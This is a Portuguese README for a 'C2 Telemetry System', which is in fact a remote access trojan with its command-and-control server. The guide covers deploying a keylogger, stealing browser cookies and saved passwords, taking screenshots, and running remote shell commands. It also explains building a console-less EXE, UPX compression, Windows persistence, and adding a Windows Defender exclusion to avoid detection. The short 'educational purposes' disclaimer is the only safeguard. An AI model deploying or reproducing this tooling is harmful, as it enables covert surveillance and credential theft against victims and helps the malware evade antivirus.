# C2 Telemetry System

Sistema completo de coleta de telemetria remota e command & control.

## 📋 Índice

- [Visão Geral](#visão-geral)
- [Funcionalidades](#funcionalidades)
- [Arquitetura](#arquitetura)
- [Requisitos](#requisitos)
- [Início Rápido](#início-rápido)
- [Configuração do Server](#configuração-do-server)
- [Configuração do Client](#configuração-do-client)
- [Exemplos de Uso](#exemplos-de-uso)
- [Referência da API](#referência-da-api)
- [Troubleshooting](#troubleshooting)
- [Notas de Segurança](#notas-de-segurança)
- [Licença](#licença)

## Visão Geral

Este sistema consiste em dois componentes:

1. **Server** (`telemetry_server.py`) — Servidor C2 HTTP que recebe telemetria e gerencia tarefas
2. **Client** (`rat_client.py`) — Agente que coleta dados do sistema e executa comandos

## Funcionalidades

### Server
- 📋 Registro e rastreamento de clients
- 📊 Ingestão de telemetria em tempo real
- 🎯 Sistema de fila de tarefas
- 📁 Armazenamento persistente (logs, tarefas, resultados)
- 🔒 Proteção contra path traversal
- 🧵 Operações thread-safe

### Client
- ⌨️ Keylogger (captura todas as teclas)
- 🍪 Stealer de cookies (Chrome, Edge, Firefox)
- 🔑 Stealer de senhas (senhas salvas nos navegadores)
- 📸 Captura de screenshots
- 📊 Telemetria do sistema (CPU, RAM, processos, disco)
- 🌐 Comunicação HTTP C2
- 💾 Armazenamento local de arquivos
- 🚀 Persistência no Windows (opcional)

## Arquitetura
┌─────────────────┐ HTTP ┌─────────────────┐
│ C2 Server │ ◄───────────────────► │ RAT Client │
│ (Flask HTTP) │ Porta 8080 │ (Python/EXE) │
│ │ │ │
│ - /register │ │ - Keylogger │
│ - /heartbeat │ │ - Cookies │
│ - /log │ │ - Senhas │
│ - /task │ │ - Screenshots │
│ - /result │ │ - Telemetria │
└─────────────────┘ └─────────────────┘
│ │
▼ ▼
┌─────────────────┐ ┌─────────────────┐
│ logs/ │ │ keylogs/ │
│ tasks/ │ │ cookies/ │
│ results/ │ │ screenshots/ │
└─────────────────┘ └─────────────────┘

## Requisitos

### Server
- Python 3.10+
- `pip install flask`

### Client
- Python 3.10+
- `pip install requests psutil pyautogui pillow pynput pywin32 pycryptodome`

### Opcional (Build EXE)
- `pip install pyinstaller`

## Início Rápido

### 1. Iniciar Server

```bash
# Instalar dependências
pip install flask

# Rodar server
python telemetry_server.py
```

Server vai iniciar em `http://0.0.0.0:8080`

### 2. Configurar Client

Edite `rat_client.py`:

```python
SERVER_URL = "http://SEU_IP_DO_SERVER:8080"
```

### 3. Rodar Client

```bash
# Instalar dependências
pip install requests psutil pyautogui pillow pynput pywin32 pycryptodome

# Rodar client
python rat_client.py
```

### 4. Verificar

```bash
# Checar clients registrados
curl http://localhost:8080/list
```

## Configuração do Server

### Passo 1: Instalar Dependências

```bash
pip install flask
```

### Passo 2: Configurar (Opcional)

Edite `telemetry_server.py`:

```python
HOST = "0.0.0.0"  # Mude se quiser interface específica
PORT = 8080       # Mude a porta se necessário

MAX_LOG_SIZE = 1_000_000      # Tamanho máximo do log em bytes
MAX_TASK_PAYLOAD = 1_000_000  # Tamanho máximo do payload em bytes
```

### Passo 3: Rodar Server

```bash
python telemetry_server.py
```

Saída esperada:
[*] C2 server: http://0.0.0.0:8080
[*] Log directory: /caminho/para/logs
[*] Tasks directory: /caminho/para/tasks
[*] Results directory: /caminho/para/results
* Running on http://0.0.0.0:8080

### Passo 4: Testar Server

```bash
# Health check
curl http://localhost:8080/health

# Registrar client teste
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"client_id": "teste-001"}'

# Listar clients
curl http://localhost:8080/list
```

### Passo 5: Deploy em Produção (Opcional)

#### Com Gunicorn

```bash
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:8080 telemetry_server:app
```

#### Com Waitress (Windows)

```bash
pip install waitress
waitress-serve --port=8080 telemetry_server:app
```

#### Com Nginx (Reverse Proxy)

```nginx
server {
    listen 80;
    server_name seu-dominio.com;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

#### Com HTTPS (Let's Encrypt)

```bash
sudo certbot --nginx -d seu-dominio.com
```

## Configuração do Client

### Passo 1: Instalar Dependências

```bash
pip install requests psutil pyautogui pillow pynput pywin32 pycryptodome
```

### Passo 2: Configurar

Edite `rat_client.py`:

```python
# MUDE ISSO para o endereço do seu servidor C2
SERVER_URL = "http://SEU_IP_DO_SERVER:8080"

# Opcional: Adicionar ao startup do Windows
PERSISTENCE = False  # True para auto-iniciar no boot

# Intervalos de coleta (segundos)
INTERVAL_TELEMETRY = 30    # Info do sistema
INTERVAL_KEYLOG = 60       # Teclas digitadas
INTERVAL_COOKIES = 300     # Cookies e senhas
INTERVAL_SCREENSHOT = 120  # Screenshots
```

### Passo 3: Testar Client

```bash
python rat_client.py
```

Verifique `client_debug.log` por erros.

### Passo 4: Build EXE (Opcional)

```bash
# Instalar PyInstaller
pip install pyinstaller

# Build EXE único
pyinstaller --onefile --noconsole --name client rat_client.py

# Saída: dist/client.exe
```

### Passo 5: Opções Avançadas

#### Adicionar Ícone

```bash
pyinstaller --onefile --noconsole --name client --icon=meuicone.ico rat_client.py
```

#### Compressão UPX

```bash
pyinstaller --onefile --noconsole --name client --upx-dir=upx rat_client.py
```

#### Esconder Janela Console

Já incluído com a flag `--noconsole`.

## Exemplos de Uso

### 1. Checar Clients Registrados

```bash
curl http://localhost:8080/list
```

Resposta:

```json
{
  "DESKTOP-ABC_user": {
    "registered_at": "2024-01-15T10:30:00+00:00",
    "last_seen": "2024-01-15T10:35:00+00:00",
    "online": true
  }
}
```

### 2. Ver Logs do Client

```bash
curl http://localhost:8080/logs/DESKTOP-ABC_user
```

### 3. Enviar Comando para Client

```bash
# Executar comando shell
curl -X POST http://localhost:8080/task \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "DESKTOP-ABC_user",
    "command": "shell",
    "args": "whoami"
  }'
```

Resposta:

```json
{
  "status": "ok",
  "task_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

### 4. Pegar Resultado da Tarefa

```bash
curl http://localhost:8080/results/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

Resposta:

```json
{
  "task_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "client_id": "DESKTOP-ABC_user",
  "status": "success",
  "output": "desktop\\admin\n",
  "error": "",
  "completed_at": "2024-01-15T10:36:00+00:00"
}
```

### 5. Comandos Disponíveis

| Comando | Descrição | Exemplo Args |
|---------|-----------|--------------|
| `shell` | Executar comando shell | `whoami`, `dir`, `ipconfig` |
| `screenshot` | Tirar screenshot | (nenhum) |
| `telemetria` | Pegar info do sistema | (nenhum) |
| `keylog` | Pegar keylogger | (nenhum) |
| `cookies` | Pegar cookies e senhas | (nenhum) |

### 6. Arquivos Locais

Client salva dados localmente:
:\caminho\para\client
├── keylogs/
│ └── keylog_20240115_103000.txt
├── cookies/
│ ├── cookies_20240115_103000.json
│ └── senhas_navegadores_20240115_103000.json
├── screenshots/
│ └── screenshot_20240115_103000.png
├── client_debug.log
└── client.exe

## Referência da API

### Endpoints do Server

#### `POST /register`

Registrar novo client.

**Requisição:**

```json
{
  "client_id": "id-unico-do-client"
}
```

**Resposta:**

```json
{
  "status": "ok",
  "client_id": "id-unico-do-client"
}
```

#### `POST /heartbeat`

Enviar heartbeat do client.

**Requisição:**

```json
{
  "client_id": "id-unico-do-client"
}
```

**Resposta:**

```json
{
  "status": "ok"
}
```

#### `POST /log`

Enviar log/telemetria.

**Requisição:**

```json
{
  "client_id": "id-unico-do-client",
  "mensagem": "Mensagem do log aqui"
}
```

**Resposta:**

```json
{
  "status": "ok"
}
```

#### `GET /list`

Listar todos os clients registrados.

**Resposta:**

```json
{
  "client-id-1": {
    "registered_at": "2024-01-15T10:30:00+00:00",
    "last_seen": "2024-01-15T10:35:00+00:00",
    "online": true
  }
}
```

#### `GET /logs/<client_id>`

Pegar logs do client.

**Resposta:** Texto puro (arquivo de log)

#### `POST /task`

Enviar tarefa para client.

**Requisição:**

```json
{
  "client_id": "id-unico-do-client",
  "command": "shell",
  "args": "whoami",
  "timeout": 30
}
```

**Resposta:**

```json
{
  "status": "ok",
  "task_id": "uuid-aqui"
}
```

#### `GET /tasks/<client_id>`

Client polla por tarefas pendentes.

**Resposta:**

```json
{
  "status": "ok",
  "task": {
    "task_id": "uuid",
    "command": "shell",
    "args": "whoami",
    "timeout": 30
  }
}
```

#### `POST /result`

Client envia resultado da tarefa.

**Requisição:**

```json
{
  "task_id": "uuid",
  "client_id": "id-do-client",
  "status": "success",
  "output": "saida do comando",
  "error": ""
}
```

**Resposta:**

```json
{
  "status": "ok"
}
```

#### `GET /results/<task_id>`

Pegar resultado da tarefa.

**Resposta:**

```json
{
  "task_id": "uuid",
  "client_id": "id-do-client",
  "status": "success",
  "output": "saida do comando",
  "error": "",
  "completed_at": "2024-01-15T10:36:00+00:00"
}
```

#### `GET /health`

Health check.

**Resposta:**

```json
{
  "status": "ok",
  "time": "2024-01-15T10:30:00+00:00"
}
```

## Troubleshooting

### Client Não Conecta

**Problema:** Client mostra erros de conexão no `client_debug.log`

**Soluções:**

1. **Verifique se server está rodando:**

   ```bash
   curl http://SEU_IP_DO_SERVER:8080/health
   ```

2. **Verifique firewall:**

   ```bash
   # Windows: Liberar porta 8080
   New-NetFirewallRule -DisplayName "C2 Server" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
   ```

3. **Verifique SERVER_URL no client:**

   Certifique que corresponde ao IP do server:

   ```python
   SERVER_URL = "http://192.168.1.100:8080"  # Não localhost se server for remoto
   ```

4. **Teste conectividade:**

   ```bash
   Test-NetConnection -ComputerName SEU_IP_DO_SERVER -Port 8080
   ```

### Senhas Aparecem [encrypted]

**Problema:** Maioria das senhas aparecem como `[encrypted]`

**Soluções:**

1. **Instale pycryptodome:**

   ```bash
   pip install pycryptodome
   ```

2. **Feche navegadores antes de rodar client:**

   Chrome/Edge travam o banco enquanto rodam.

3. **Rode como mesmo usuário:**

   Decryptação DPAPI requer mesmo usuário Windows que salvou as senhas.

### Keylogger Não Captura

**Problema:** Pasta `keylogs/` está vazia

**Soluções:**

1. **Verifique pynput instalado:**

   ```bash
   pip install pynput
   ```

2. **Rode como administrador:**

   Alguns sistemas requerem admin para hooks de keylogger.

3. **Verifique antivírus:**

   Windows Defender pode bloquear keylogger. Adicione exclusão:

   ```powershell
   Add-MpPreference -ExclusionPath "C:\caminho\para\client.exe"
   ```

### Server Cai

**Problema:** Server para inesperadamente

**Soluções:**

1. **Verifique logs:**

   Procure erros no output do console.

2. **Use server de produção:**

   ```bash
   pip install gunicorn
   gunicorn -w 4 -b 0.0.0.0:8080 telemetry_server:app
   ```

3. **Aumente limites:**

   Edite `MAX_LOG_SIZE` e `MAX_TASK_PAYLOAD` no `telemetry_server.py`.

### Build EXE Falha

**Problema:** Erros do PyInstaller

**Soluções:**

1. **Atualize PyInstaller:**

   ```bash
   pip install --upgrade pyinstaller
   ```

2. **Hidden imports:**

   ```bash
   pyinstaller --onefile --noconsole --name client --hidden-import=pynput --hidden-import=win32crypt rat_client.py
   ```

3. **Build limpo:**

   ```bash
   rmdir /s build dist
   pyinstaller --onefile --noconsole --name client rat_client.py
   ```

## Notas de Segurança

⚠️ **Apenas para fins educacionais. Não use sem permissão explícita.**

### Segurança do Server

- Client IDs são sanitizados para prevenir path traversal
- File locks previnem problemas de acesso concorrente
- Tamanhos máximos de payload previnem ataques DoS
- Considere adicionar autenticação para uso em produção
- Use HTTPS em produção (Let's Encrypt)

### Segurança do Client

- Executável pode ser flagrado por antivírus (detecção comportamental)
- Keylogger requer permissões apropriadas
- Decryptação DPAPI só funciona para mesmo usuário Windows
- Considere code signing para uso em produção

### Aviso Legal

Este software é fornecido apenas para fins educacionais e de pesquisa. Acesso não autorizado a sistemas de computador é ilegal. Use este software apenas em sistemas que você possui ou tem permissão explícita para testar.

## Licença

Licença MIT

Copyright (c) 2024

É concedida permissão, gratuitamente, a qualquer pessoa que obtenha uma cópia deste software e arquivos de documentação associados (o "Software"), para lidar no Software sem restrição, incluindo sem limitação os direitos de usar, copiar, modificar, mesclar, publicar, distribuir, sublicenciar e/ou vender cópias do Software, e permitir pessoas a quem o Software é fornecido a fazê-lo, sujeito às seguintes condições:

O aviso de copyright acima e este aviso de permissão devem ser incluídos em todas as cópias ou partes substanciais do Software.

O SOFTWARE É FORNECIDO "COMO ESTÁ", SEM GARANTIA DE QUALQUER TIPO, EXPRESSA OU IMPLÍCITA, INCLUINDO MAS NÃO SE LIMITANDO ÀS GARANTIAS DE COMERCIALIZAÇÃO, ADEQUAÇÃO A UM DETERMINADO FIM E NÃO VIOLAÇÃO. EM NENHUM CASO OS AUTORES OU DETENTORES DOS DIREITOS AUTORAIS SERÃO RESPONSÁVEIS POR QUALQUER RECLAMAÇÃO, DANOS OU OUTRA RESPONSABILIDADE, SEJA EM AÇÃO DE CONTRATO, ATO ILÍCITO OU DE OUTRA FORMA, DECORRENTE DE, FORA DE OU EM CONEXÃO COM O SOFTWARE OU O USO OU OUTROS NEGÓCIOS NO SOFTWARE.
